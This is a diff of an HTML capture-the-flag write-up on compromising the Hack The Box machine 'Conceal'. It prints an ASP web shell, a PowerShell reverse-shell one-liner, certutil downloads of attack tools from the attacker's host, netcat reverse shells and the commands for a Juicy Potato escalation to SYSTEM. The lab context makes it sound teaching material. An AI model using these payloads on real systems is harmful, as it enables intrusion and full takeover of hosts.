@@ -81,25 +81,23 @@
 
 <h2 id="quick-summary">Quick Summary</h2>
 <p><br> Hey guys today Conceal retired and here’s my write-up about it. Conceal was a straightforward fun box, The only tricky part about it is gaining <a href="https://en.wikipedia.org/wiki/IPsec" target="_blank" rel="noopener noreferrer">IPSEC</a> connection to gain access to some filtered services. That first part involved some guessing but after that everything is simple and very straightforward. I liked this machine and it was a very fun one. It’s a windows machine and its ip is <code class="highlighter-rouge">10.10.10.116</code>, I added it to <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">conceal.htb</code>. Let’s jump right in.
-<img src="/images/hackthebox/conceal/0.png" alt=""></p>
+<br><img src="/images/hackthebox/conceal/0.png" alt=""><br></p>
 <hr>
 
 <h2 id="nmap">Nmap</h2>
 <p><br> As always we will start with <code class="highlighter-rouge">nmap</code> to scan for open ports and services.
-<code class="highlighter-rouge">nmap -sV -sT -sC conceal.htb</code>
-<img src="/images/hackthebox/conceal/1.png" alt="">
+<br><code class="highlighter-rouge">nmap -sV -sT -sC conceal.htb</code>
+<br><img src="/images/hackthebox/conceal/1.png" alt=""><br>
 <br> And we got nothing !
 <br> I ran another <code class="highlighter-rouge">nmap</code> UDP scan on all ports :
-<code class="highlighter-rouge">nmap -vvv -sU -o nmapudp conceal.htb --max-retries 0</code>
+<br><code class="highlighter-rouge">nmap -vvv -sU -o nmapudp conceal.htb --max-retries 0</code>
 <br> The output was too long so I will show the only important part :
-<img src="/images/hackthebox/conceal/2.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/conceal/3.png" alt="">
+<br><img src="/images/hackthebox/conceal/2.png" alt=""><br>
+<br><img src="/images/hackthebox/conceal/3.png" alt=""><br>
 <br> It was not sure about port 161, but it showed that port 500 is open.
 <br> I ran a third scan on ports 500 and 161 :
-<code class="highlighter-rouge">nmap -p 161,500 -sV -sU -sC conceal.htb</code>
-<img src="/images/hackthebox/conceal/4.png" alt="">
+<br><code class="highlighter-rouge">nmap -p 161,500 -sV -sU -sC conceal.htb</code>
+<br><img src="/images/hackthebox/conceal/4.png" alt=""><br>
 <br> Full Output :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Nmap 7.70 scan initiated Fri May 17 16:37:52 2019 as: nmap -p 161,500 -sV -sU -sC -o nmapudp2 conceal.htb
 Nmap scan report for conceal.htb (10.10.10.116)
@@ -424,12 +422,12 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 <h2 id="snmp-enumeration">Snmp Enumeration</h2>
 <p><br> I started with <code class="highlighter-rouge">snmpwalk</code> : 
-<code class="highlighter-rouge">snmpwalk -c public -v 1 conceal.htb</code>
+<br><code class="highlighter-rouge">snmpwalk -c public -v 1 conceal.htb</code>
 <br> The output was very long but we only need this first part : 
-<img src="/images/hackthebox/conceal/5.png" alt="">
+<br><img src="/images/hackthebox/conceal/5.png" alt=""><br>
 <br> We have a password hash for the <code class="highlighter-rouge">IPSEC</code> connection : <code class="highlighter-rouge">9C8B1A372B1878851BE2C097031B6E43</code>
 <br> I used <a href="https://crackstation.net/" target="_blank" rel="noopener noreferrer">crackstation</a> to crack it and I got this result :
-<img src="/images/hackthebox/conceal/6.png" alt="">
+<br><img src="/images/hackthebox/conceal/6.png" alt=""><br>
 <br> Great ! Now we need to enumerate the <code class="highlighter-rouge">ike</code> vpn service to know how to connect to it. 
 <br></p>
 <hr>
@@ -437,11 +435,10 @@ Service detection performed. Please report any incorrect results at https://nmap
 <h2 id="ike-scan-setting-up-the-connection">
 <code class="highlighter-rouge">ike-scan</code>, Setting up The Connection</h2>
 <p><br> I ran <code class="highlighter-rouge">ike-scan</code> and got these results :
-<img src="/images/hackthebox/conceal/7.png" alt="">
+<br><img src="/images/hackthebox/conceal/7.png" alt=""><br>
 <br> I installed <code class="highlighter-rouge">strongswan</code> to set up the <code class="highlighter-rouge">IPSEC</code> connection. With the help of the info I got from <code class="highlighter-rouge">ike-scan</code> and some guessing I could come up with this configuration which worked : 
-<br>
-<code class="highlighter-rouge">/etc/ipsec.conf</code> :
-<img src="/images/hackthebox/conceal/8.png" alt=""></p>
+<br><code class="highlighter-rouge">/etc/ipsec.conf</code> :
+<br><img src="/images/hackthebox/conceal/8.png" alt=""><br></p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>conn rick-to-conceal
         authby=secret
         auto=route
@@ -453,34 +450,30 @@ Service detection performed. Please report any incorrect results at https://nmap
         esp=3des-sha1
         rightprotoport=tcp
 </code></pre></div></div>
-<p><br>
-<br>
-<code class="highlighter-rouge">/etc/ipsec.secrets</code> :
-<img src="/images/hackthebox/conceal/9.png" alt=""></p>
+<p><br><code class="highlighter-rouge">/etc/ipsec.secrets</code> :
+<br><img src="/images/hackthebox/conceal/9.png" alt=""><br></p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.xx.xx 10.10.10.116 : PSK "Dudecake1!"
 </code></pre></div></div>
 <p><br> I started <code class="highlighter-rouge">ipsec</code> then I initialized the connection :
-<code class="highlighter-rouge">ipsec start</code>
-<br>
-<br>
-<code class="highlighter-rouge">ipsec up rick-to-conceal</code>
-<img src="/images/hackthebox/conceal/10.png" alt="">
+<br><code class="highlighter-rouge">ipsec start</code>
+<br><code class="highlighter-rouge">ipsec up rick-to-conceal</code>
+<br><img src="/images/hackthebox/conceal/10.png" alt=""><br>
 <br> It worked fine, now we are connected to a vpn network let’s see what new services can we get.
 <br></p>
 <hr>
 
 <h2 id="nmap-second-time">Nmap (Second Time)</h2>
-<p><code class="highlighter-rouge">nmap -sV -sT -sC conceal.htb</code>
-<img src="/images/hackthebox/conceal/11.png" alt="">
+<p><br><code class="highlighter-rouge">nmap -sV -sT -sC conceal.htb</code>
+<br><img src="/images/hackthebox/conceal/11.png" alt=""><br>
 <br> We got ftp on port 21 , http on port 80 and smb on port 445. I wanted to check ftp first and see if I can authenticate anonymously.</p>
 <hr>
 
 <h2 id="ftp-file-upload-reverse-shell-and-user-flag">FTP, File Upload, Reverse Shell and User Flag</h2>
-<p><img src="/images/hackthebox/conceal/12.png" alt="">
+<p><br><img src="/images/hackthebox/conceal/12.png" alt=""><br>
 <br> It worked but there was literally nothing on that ftp server. I uploaded a test file to check if I have write permissions on that ftp server and I had.
-<img src="/images/hackthebox/conceal/13.png" alt="">
+<br><img src="/images/hackthebox/conceal/13.png" alt=""><br>
 <br> I Checked the http service and there was only the default IIS page :
-<img src="/images/hackthebox/conceal/14.png" alt="">
+<br><img src="/images/hackthebox/conceal/14.png" alt=""><br>
 <br> I ran <code class="highlighter-rouge">gobuster</code> with <code class="highlighter-rouge">/usr/share/wordlists/dirb/common.txt</code> and got only one directory called <code class="highlighter-rouge">/upload</code> :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster -u http://conceal.htb/ -w /usr/share/wordlists/dirb/common.txt
 
@@ -502,108 +495,101 @@ Gobuster v2.0.0              OJ Reeves (@TheColonial)
 =====================================================
 </code></pre></div></div>
 <p><br> I went to <code class="highlighter-rouge">/upload</code> and found my test file : 
-<img src="/images/hackthebox/conceal/15.png" alt="">
+<br><img src="/images/hackthebox/conceal/15.png" alt=""><br>
 <br> Great ! I uploaded an <code class="highlighter-rouge">asp</code> shell to get remote code execution : 
-<img src="/images/hackthebox/conceal/16.png" alt="">
+<br><img src="/images/hackthebox/conceal/16.png" alt=""><br>
 <br> <code class="highlighter-rouge">shell.asp</code> :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;!--
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!--
 ASP Webshell
 Working on latest IIS 
 Referance :- 
 https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.asp
 http://stackoverflow.com/questions/11501044/i-need-execute-a-command-line-in-a-visual-basic-script
 http://www.w3schools.com/asp/
---&gt;
+--&gt;</span>
 
 
-&lt;%
-Set oScript = Server.CreateObject("WSCRIPT.SHELL")
-Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
-Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
-Function getCommandOutput(theCommand)
-    Dim objShell, objCmdExec
-    Set objShell = CreateObject("WScript.Shell")
-    Set objCmdExec = objshell.exec(thecommand)
-    getCommandOutput = objCmdExec.StdOut.ReadAll
-end Function
-%&gt;
+<span class="nt">&lt;</span><span class="err">%</span>
+<span class="na">Set</span> <span class="na">oScript =</span><span class="err"> </span><span class="s">Server.CreateObject("WSCRIPT.SHELL")</span>
+<span class="na">Set</span> <span class="na">oScriptNet =</span><span class="err"> </span><span class="s">Server.CreateObject("WSCRIPT.NETWORK")</span>
+<span class="na">Set</span> <span class="na">oFileSys =</span><span class="err"> </span><span class="s">Server.CreateObject("Scripting.FileSystemObject")</span>
+<span class="na">Function</span> <span class="na">getCommandOutput</span><span class="err">(</span><span class="na">theCommand</span><span class="err">)</span>
+    <span class="na">Dim</span> <span class="na">objShell</span><span class="err">,</span> <span class="na">objCmdExec</span>
+    <span class="na">Set</span> <span class="na">objShell =</span><span class="err"> </span><span class="s">CreateObject("WScript.Shell")</span>
+    <span class="na">Set</span> <span class="na">objCmdExec =</span><span class="err"> </span><span class="s">objshell.exec(thecommand)</span>
+    <span class="na">getCommandOutput =</span><span class="err"> </span><span class="s">objCmdExec.StdOut.ReadAll</span>
+<span class="na">end</span> <span class="na">Function</span>
+<span class="err">%</span><span class="nt">&gt;</span>
 
 
-&lt;HTML&gt;
-&lt;BODY&gt;
-&lt;FORM action="" method="GET"&gt;
-&lt;input type="text" name="cmd" size=45 value="&lt;%= szCMD %&gt;"&gt;
-&lt;input type="submit" value="Run"&gt;
-&lt;/FORM&gt;
-&lt;PRE&gt;
-&lt;%= "\\" &amp; oScriptNet.ComputerName &amp; "\" &amp; oScriptNet.UserName %&gt;
-&lt;%Response.Write(Request.ServerVariables("server_name"))%&gt;
-&lt;p&gt;
-&lt;b&gt;The server's port:&lt;/b&gt;
-&lt;%Response.Write(Request.ServerVariables("server_port"))%&gt;
-&lt;/p&gt;
-&lt;p&gt;
-&lt;b&gt;The server's software:&lt;/b&gt;
-&lt;%Response.Write(Request.ServerVariables("server_software"))%&gt;
-&lt;/p&gt;
-&lt;p&gt;
-&lt;b&gt;The server's software:&lt;/b&gt;
-&lt;%Response.Write(Request.ServerVariables("LOCAL_ADDR"))%&gt;
-&lt;% szCMD = request("cmd")
-thisDir = getCommandOutput("cmd /c" &amp; szCMD)
-Response.Write(thisDir)%&gt;
-&lt;/p&gt;
-&lt;br&gt;
-&lt;/BODY&gt;
-&lt;/HTML&gt;
+<span class="nt">&lt;HTML&gt;</span>
+<span class="nt">&lt;BODY&gt;</span>
+<span class="nt">&lt;FORM</span> <span class="na">action=</span><span class="s">""</span> <span class="na">method=</span><span class="s">"GET"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"cmd"</span> <span class="na">size=</span><span class="s">45</span> <span class="na">value=</span><span class="s">"&lt;%= szCMD %&gt;"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Run"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;/FORM&gt;</span>
+<span class="nt">&lt;PRE&gt;</span>
+<span class="nt">&lt;</span><span class="err">%=</span> <span class="err">"\\"</span> <span class="err">&amp;</span> <span class="na">oScriptNet</span><span class="err">.</span><span class="na">ComputerName</span> <span class="err">&amp;</span> <span class="err">"\"</span> <span class="err">&amp;</span> <span class="na">oScriptNet</span><span class="err">.</span><span class="na">UserName</span> <span class="err">%</span><span class="nt">&gt;</span>
+<span class="nt">&lt;</span><span class="err">%</span><span class="na">Response</span><span class="err">.</span><span class="na">Write</span><span class="err">(</span><span class="na">Request</span><span class="err">.</span><span class="na">ServerVariables</span><span class="err">("</span><span class="na">server_name</span><span class="err">"))%</span><span class="nt">&gt;</span>
+<span class="nt">&lt;p&gt;</span>
+<span class="nt">&lt;b&gt;</span>The server's port:<span class="nt">&lt;/b&gt;</span>
+<span class="nt">&lt;</span><span class="err">%</span><span class="na">Response</span><span class="err">.</span><span class="na">Write</span><span class="err">(</span><span class="na">Request</span><span class="err">.</span><span class="na">ServerVariables</span><span class="err">("</span><span class="na">server_port</span><span class="err">"))%</span><span class="nt">&gt;</span>
+<span class="nt">&lt;/p&gt;</span>
+<span class="nt">&lt;p&gt;</span>
+<span class="nt">&lt;b&gt;</span>The server's software:<span class="nt">&lt;/b&gt;</span>
+<span class="nt">&lt;</span><span class="err">%</span><span class="na">Response</span><span class="err">.</span><span class="na">Write</span><span class="err">(</span><span class="na">Request</span><span class="err">.</span><span class="na">ServerVariables</span><span class="err">("</span><span class="na">server_software</span><span class="err">"))%</span><span class="nt">&gt;</span>
+<span class="nt">&lt;/p&gt;</span>
+<span class="nt">&lt;p&gt;</span>
+<span class="nt">&lt;b&gt;</span>The server's software:<span class="nt">&lt;/b&gt;</span>
+<span class="nt">&lt;</span><span class="err">%</span><span class="na">Response</span><span class="err">.</span><span class="na">Write</span><span class="err">(</span><span class="na">Request</span><span class="err">.</span><span class="na">ServerVariables</span><span class="err">("</span><span class="na">LOCAL_ADDR</span><span class="err">"))%</span><span class="nt">&gt;</span>
+<span class="nt">&lt;</span><span class="err">%</span> <span class="na">szCMD =</span><span class="err"> </span><span class="s">request("cmd")</span>
+<span class="na">thisDir =</span><span class="err"> </span><span class="s">getCommandOutput("cmd</span> <span class="err">/</span><span class="na">c</span><span class="err">"</span> <span class="err">&amp;</span> <span class="na">szCMD</span><span class="err">)</span>
+<span class="na">Response</span><span class="err">.</span><span class="na">Write</span><span class="err">(</span><span class="na">thisDir</span><span class="err">)%</span><span class="nt">&gt;</span>
+<span class="nt">&lt;/p&gt;</span>
+<span class="nt">&lt;br&gt;</span>
+<span class="nt">&lt;/BODY&gt;</span>
+<span class="nt">&lt;/HTML&gt;</span>
 </code></pre></div></div>
-<p><img src="/images/hackthebox/conceal/17.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/conceal/18.png" alt="">
+<p><br><img src="/images/hackthebox/conceal/17.png" alt=""><br>
+<br><img src="/images/hackthebox/conceal/18.png" alt=""><br>
 <br> I got a powershell reverse shell : 
-<img src="/images/hackthebox/conceal/19.png" alt="">
+<br><img src="/images/hackthebox/conceal/19.png" alt=""><br>
 <br> Payload :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.xx.xx',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell -nop -c <span class="s2">"</span><span class="nv">$client</span><span class="s2"> = New-Object System.Net.Sockets.TCPClient('10.10.xx.xx',1337);</span><span class="nv">$stream</span><span class="s2"> = </span><span class="nv">$client</span><span class="s2">.GetStream();[byte[]]</span><span class="nv">$bytes</span><span class="s2"> = 0..65535|%{0};while((</span><span class="nv">$i</span><span class="s2"> = </span><span class="nv">$stream</span><span class="s2">.Read(</span><span class="nv">$bytes</span><span class="s2">, 0, </span><span class="nv">$bytes</span><span class="s2">.Length)) -ne 0){;</span><span class="nv">$data</span><span class="s2"> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(</span><span class="nv">$bytes</span><span class="s2">,0, </span><span class="nv">$i</span><span class="s2">);</span><span class="nv">$sendback</span><span class="s2"> = (iex </span><span class="nv">$data</span><span class="s2"> 2&gt;&amp;1 | Out-String );</span><span class="nv">$sendback2</span><span class="s2"> = </span><span class="nv">$sendback</span><span class="s2"> + 'PS ' + (pwd).Path + '&gt; ';</span><span class="nv">$sendbyte</span><span class="s2"> = ([text.encoding]::ASCII).GetBytes(</span><span class="nv">$sendback2</span><span class="s2">);</span><span class="nv">$stream</span><span class="s2">.Write(</span><span class="nv">$sendbyte</span><span class="s2">,0,</span><span class="nv">$sendbyte</span><span class="s2">.Length);</span><span class="nv">$stream</span><span class="s2">.Flush()};</span><span class="nv">$client</span><span class="s2">.Close()"</span>
 </code></pre></div></div>
-<p><img src="/images/hackthebox/conceal/20.png" alt="">
+<p><br><img src="/images/hackthebox/conceal/20.png" alt=""><br>
 <br> We got user.
 <br></p>
 <hr>
 
 <h2 id="seimpersonateprivilege-juicy-potato-privilege-escalation-and-root-flag">SeImpersonatePrivilege, Juicy Potato, Privilege Escalation and Root Flag</h2>
 <p><br> After getting user the privilege escalation is easy and straightforward. Before doing any enumeration I checked my privileges as <code class="highlighter-rouge">Destitute</code> and I found that I had the <code class="highlighter-rouge">SeImpersonatePrivilege</code>.
-<img src="/images/hackthebox/conceal/21.png" alt="">
+<br><img src="/images/hackthebox/conceal/21.png" alt=""><br>
 <br> This means that we can apply the famous attack <code class="highlighter-rouge">Juicy Potato</code>. You can read about it on the <a href="https://github.com/ohpe/juicy-potato" target="_blank" rel="noopener noreferrer">official github repository</a>. We need to know the version of this windows to pick the right <code class="highlighter-rouge">clsid</code>. 
-<code class="highlighter-rouge">systeminfo</code>
-<img src="/images/hackthebox/conceal/22.png" alt="">
-<br> It’s <code class="highlighter-rouge">Microsoft Windows 10 Enterprise</code>. I got the <code class="highlighter-rouge">clsid</code> of  <code class="highlighter-rouge">wuauserv</code> from <a href="https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_10_Enterprise" target="_blank" rel="noopener noreferrer">here</a> which is : <code class="highlighter-rouge">{e60687f7-01a1-40aa-86ac-db1cbf673334}</code>
+<br><code class="highlighter-rouge">systeminfo</code>
+<br><img src="/images/hackthebox/conceal/22.png" alt=""><br>
+<br> It’s <code class="highlighter-rouge">Microsoft Windows 10 Enterprise</code>. I got the <code class="highlighter-rouge">clsid</code> of  <code class="highlighter-rouge">wuauserv</code> from <a href="https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_10_Enterprise" target="_blank" rel="noopener noreferrer">here</a> which is :
+<br><code class="highlighter-rouge">{e60687f7-01a1-40aa-86ac-db1cbf673334}</code>
 <br> I got a compiled binary of <code class="highlighter-rouge">Juicy Potato</code> from the github repository. I hosted it on a python simple http server then I downloaded it on the machine with <code class="highlighter-rouge">certutil</code> :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certutil -urlcache -split -f http://10.10.xx.xx/juicypotato.exe juicypotato.exe
 </code></pre></div></div>
-<p><img src="/images/hackthebox/conceal/23.png" alt="">
+<p><br><img src="/images/hackthebox/conceal/23.png" alt=""><br>
 <br> However I had some problems with my powershell reverse shell and it couldn’t run <code class="highlighter-rouge">juicypotato.exe</code> properly so I got another <code class="highlighter-rouge">cmd</code> shell with <code class="highlighter-rouge">nc</code> :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certutil -urlcache -split -f http://10.10.xx.xx/nc.exe nc.exe
 </code></pre></div></div>
-<p><br>
-<br>
-<code class="highlighter-rouge">nc.exe -e cmd.exe 10.10.xx.xx 1339</code>
-<img src="/images/hackthebox/conceal/24.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/conceal/25.png" alt="">
+<p><br><code class="highlighter-rouge">nc.exe -e cmd.exe 10.10.xx.xx 1339</code>
+<br><img src="/images/hackthebox/conceal/24.png" alt=""><br>
+<br><img src="/images/hackthebox/conceal/25.png" alt=""><br>
 <br> I created a <code class="highlighter-rouge">bat</code> file that executes : <code class="highlighter-rouge">nc.exe -e cmd.exe 10.10.xx.xx 1340</code> to get me a reverse shell :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo C:\users\Destitute\appdata\local\temp\nc.exe -e cmd.exe 10.10.xx.xx 1340 &gt; rev.bat
 </code></pre></div></div>
 <p><br> Then I ran <code class="highlighter-rouge">juicypotato.exe</code> and made it execute that <code class="highlighter-rouge">bat</code> file :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>juicypotato.exe -p C:\users\Destitute\appdata\local\temp\rev.bat -l 1340 -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
 </code></pre></div></div>
-<p><img src="/images/hackthebox/conceal/26.png" alt="">
+<p><br><img src="/images/hackthebox/conceal/26.png" alt=""><br>
 <br> It worked fine and we got a reverse shell as <code class="highlighter-rouge">nt authority\system</code>
-<img src="/images/hackthebox/conceal/27.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/conceal/28.png" alt="">
+<br><img src="/images/hackthebox/conceal/27.png" alt=""><br>
+<br><img src="/images/hackthebox/conceal/28.png" alt=""><br>
 <br> And we owned root !
 <br>
 <br>
